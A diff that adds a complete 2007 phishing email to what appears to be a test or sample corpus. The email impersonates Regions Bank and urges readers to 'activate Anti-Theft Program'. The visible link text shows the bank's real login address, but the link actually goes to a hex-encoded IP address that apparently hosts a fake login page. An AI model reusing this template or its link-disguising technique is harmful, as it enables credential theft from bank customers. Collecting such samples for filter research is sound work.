@@ -1,0 +1,65 @@
+Return-Path: <accounts@regions.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 1244246980
+	for <user@login.example.com>; Wed, 31 Jan 2007 17:31:56 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by mail.example.org (Postfix) with ESMTP id 4A132131FB5A
+	for <user@example.com>; Wed, 31 Jan 2007 17:31:53 -0500 (EST)
+Received: from mail.arlenness.com (h-67-102-110-101.snfccasy.covad.net [67.102.110.101])
+	by mail.example.org (Postfix) with ESMTP id 0F6406FA1C9
+	for <user@example.com>; Wed, 31 Jan 2007 17:31:52 -0500 (EST)
+Received: from User ([72.54.78.226]) by mail.arlenness.com with Microsoft SMTPSVC(6.0.3790.1830);
+	 Wed, 31 Jan 2007 14:31:30 -0800
+Reply-To: <no-reply@regions.com>
+From: "Regions Bank"<accounts@regions.com>
+Subject: Protect your RegionsNet® against phishing scams by activate Anti-Theft Program
+Date: Wed, 31 Jan 2007 17:31:25 -0500
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2800.1081
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1081
+Message-ID: <MAILSERVERD5euwdUTa000013db@mail.arlenness.com>
+X-OriginalArrivalTime: 31 Jan 2007 22:31:30.0527 (UTC) FILETIME=[8DCCF6F0:01C74587]
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 731
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Regions Bank</title>
+</head>
+
+<body>
+
+<div style="width: 600px; margin: 0 auto 0 auto; border: 0px dashed black; padding: 20px 15px 1px 15px; font-size: 12px">
+<img src="http://files.bnpmedia.com/directories/211/2006/296573/regionsbank_06.jpg" width="200" height="52" />
+<p style="font-weight: bold; color: #072510; font-family: arial;" >MEMBER NOTICE: </p>
+<p style="font-weight: bold; color: #072510; font-family: arial;" align="justify">Currently we are trying to upgrade RegionsNet®  Online Accounts for security measures.
+Anti-Theft Program will allow us to verify your identity from your computer, at home, at work, anywhere. When you access your account we'll know it's you. With our new Anti-Theft Program you are helping not only yourself but also Regions bank. We apreciate your support and understanding our banking method authentications. </p>
+<p style="font-weight: bold; color: #072510; font-family: arial;" align="justify">Businesses are continually concerned about the ever increasing sophistication in the types of frauds that are being committed today. Many of these frauds begin with the theft of private information. Business Authentication allows us to provide additional protection and enables you to have further control over the type of information or transactions accessed by your employees.
+
+<p style="font-weight: bold; color: #072510; font-family: arial;" align="justify">Please Note: Regions Bank will never ask for your Personal Identification Number via e-mail or phone.</p>
+
+</p>
+<p style="font-weight: bold; color: #072510; font-family: arial;" align="justify">Activate Anti-Theft Program and confirm the authentication procedure by following the link below.   </p>
+<p style="font-weight: bold; color: #074580; font-family: arial;" align="center">
+<a style="color: #074580" href="http://0xc9.0x10.0xfc.0xcb/secure.regionsnet.com/EBanking/logon/user.htm
+">https://secure.regionsnet.com/EBanking/logon/user?a=</a></p>
+
+
+<img src="http://www.credit-land.com/images/cards/3183.gif" width="160" height="130"></a><a onmouseover="rollem('2');window.status='';return true;" onmouseout="hidem('2');" </a></td>
+<div align="center" style="margin-top: 20px;MARGIN-BOTTOM: 10px; COLOR: #666666; font-family: arial; text-align: center; background-image: url('http://www.chase.com/ccpmweb/generic/image/footer_gradient.gif'); height: 30px">2007 © Regions Bank - RegionsNet® Online  Member FDIC. Equal Housing Lender <img class="inline" height="13" alt="" src="http://www.bankofthewest.com/BOW/assets/vcmStaticContent/images/icon_ehl.gif" width="18" /><br />.</div>.</div>
+</div>
+</body>
+</html>
+
